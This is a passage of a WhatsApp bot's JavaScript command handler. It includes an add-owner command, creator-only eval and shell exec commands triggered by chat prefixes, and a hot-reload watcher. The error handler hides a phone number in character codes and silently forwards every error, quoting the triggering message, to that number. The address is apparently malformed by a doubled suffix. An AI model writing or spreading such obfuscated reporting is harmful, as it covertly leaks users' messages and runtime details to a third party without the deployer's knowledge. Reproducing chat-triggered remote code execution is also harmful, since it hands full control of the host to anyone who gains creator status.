if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (m.text.toLowerCase() == "bot") {
m.reply("Bot Online ✅")
}

//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
FardanDev.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});